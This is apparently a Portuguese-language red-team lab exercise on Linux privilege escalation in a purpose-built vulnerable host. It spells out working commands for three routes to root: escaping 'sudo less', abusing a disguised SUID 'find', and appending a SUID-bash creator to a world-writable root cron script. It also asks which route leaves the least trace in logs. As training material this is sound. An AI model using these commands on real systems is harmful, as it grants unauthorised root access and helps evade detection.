# Lab 03 — Permissões e escalada de privilégio

> 🔴 **Red Team** · ⭐⭐ Intermediário · ⏱️ ~40 min · 🏅 200 pontos
>
> Pré-requisito: sessão como `dev01` (lab 01 e 02 feitos).

## 🎯 Objetivo

Você já sabe que existe coisa errada no host. Agora vai **transformar configuração ruim em root**.

O host tem **três caminhos** de escalada diferentes. O desafio não é achar um — é entender o mecanismo por trás de cada um e escolher o mais discreto.

Ao final:

- root obtido por **pelo menos 2 caminhos distintos**
- flag 3 lida de `/root/flag3.txt`
- 1 parágrafo explicando qual caminho deixa **menos rastro**

## 🧩 Cenário

```bash
su - dev01     # senha: V4mosLab!01
id             # uid=1001(dev01) ... (sem sudo de verdade)
```

O host tem três problemas plantados:

1. uma regra de `sudoers` frouxa
2. um binário SUID fora do padrão em `/opt/cyberlab/bin`
3. um script executado como root por cron, gravável por qualquer usuário

## 📌 Tarefas

### Tarefa 1 — Enumere os caminhos

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null | grep -v -E '^/(usr/)?s?bin/'
ls -la /opt/cyberlab/scripts/
cat /etc/cron.d/cyberlab-maintenance
```

**Entrega:** tabela com `vetor | por que é perigoso | como explorar (em 1 linha)`.

---

### Tarefa 2 — Caminho A: sudo inseguro

O `dev01` pode rodar um binário como root **sem senha**. Descubra qual e o que ele permite fazer.

Referência: <https://gtfobins.github.io/> → procure o binário na lista.

**Entrega:** comando completo usado e a saída de `id`.

---

### Tarefa 3 — Caminho B: SUID disfarçado

`/opt/cyberlab/bin/.cache-helper` é uma **cópia** de um binário legítimo com bit SUID e dono `root`.

1. Descubra qual binário é:

```bash
file /opt/cyberlab/bin/.cache-helper
strings /opt/cyberlab/bin/.cache-helper | head -30
```

2. Abuse dele para abrir um shell como root.

> 💡 Shell via SUID precisa de `-p` para **não** dropar privilégio: `/bin/sh -p`.

**Entrega:** comando usado + `id`.

---

### Tarefa 4 — Caminho C: cron com script gravável

O cron executa `/opt/cyberlab/scripts/maintenance.sh` como `root` **a cada 2 minutos**. O arquivo é `777`.

Modifique o script para criar um shell SUID e espere o cron rodar:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/cyberlab/scripts/maintenance.sh
# espere ~2 minutos
ls -l /tmp/rootbash
/tmp/rootbash -p
id
```

**Entrega:** o horário em que o arquivo apareceu e a saída de `id`.

> ⚠️ Depois de usar, remova a linha que você adicionou (ou rode `sudo ./setup/reset.sh`). Deixar isso no host é o que o lab 04 vai caçar.

---

### Tarefa 5 — Flag 3

Como root:

```bash
cat /root/flag3.txt
```

**Entrega:** flag em `flags.md` + qual dos três caminhos você usou.

---

### Tarefa 6 — Qual é o mais discreto?

Compare os três vetores pensando em **logs**:

| Vetor | O que registra | Facilidade de detecção |
| :-- | :-- | :-- |
| `sudo less` | | |
| SUID `find` | | |
| cron `777` | | |

**Entrega:** 1 parágrafo com sua conclusão.

---

## 💡 Dicas

<details>
<summary>Dica 1 — como ler o sudo -l</summary>

```bash
sudo -l
```

Procure por:

```
User dev01 may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/less
```

`NOPASSWD` = sem senha. `(root)` = com privilégio total. O binário é o que importa: **o que ele consegue executar de dentro dele?**

</details>

<details>
<summary>Dica 2 — o truque do less</summary>

O `less` tem um comando interno que executa shell:

```
!comando
```

Abra qualquer arquivo com o `less` (como root) e digite `!sh`.

```bash
sudo less /etc/hosts
# dentro do less:
!sh
id
```

</details>

<details>
<summary>Dica 3 — find com SUID</summary>

O `find` tem o parâmetro `-exec`, que executa um comando. Se o `find` é SUID root, o comando herda o privilégio.

```bash
/opt/cyberlab/bin/.cache-helper . -exec /bin/sh -p \; -quit
```

`-quit` faz o `find` sair logo depois, para não varrer o diretório inteiro.

</details>

<details>
<summary>Dica 4 — cron não roda na hora</summary>

O agendamento é `*/2 * * * *` (a cada 2 minutos). Você pode:

- esperar e olhar o relógio
- acompanhar com `watch -n 5 ls -l /tmp/rootbash`
- forçar a execução manualmente **como seu usuário** para testar o script (não terá privilégio de root, mas valida a sintaxe)

Se não aparecer nada em 4 minutos, verifique se o serviço `cron` está ativo:

```bash
systemctl status cron
```

</details>

<details>
<summary>Dica 5 — root direto sem SUID</summary>

Se você já tem root por um dos caminhos, pode simplesmente:

```bash
cat /root/flag3.txt
```

Não precisa dos três caminhos para pegar a flag — precisa dos três para **entender** o lab.

</details>

## ✅ Critérios de conclusão

- [ ] Root obtido por 2 caminhos diferentes
- [ ] Flag 3 registrada
- [ ] Tabela de vetores preenchida
- [ ] Parágrafo sobre stealth escrito

## 🧠 Para o Blue Team

1. `sudo` registra tudo. Onde? (lab 06)
2. Um SUID novo em `/opt` aparece em qual log? (dica: talvez em **nenhum** — e é por isso que `auditd` existe)
3. Por que "script de cron `777`" é pior que "senha fraca"?

---

<details>
<summary>🔓 Solução comentada (spoiler)</summary>

Veja [`solution.md`](solution.md).

</details>
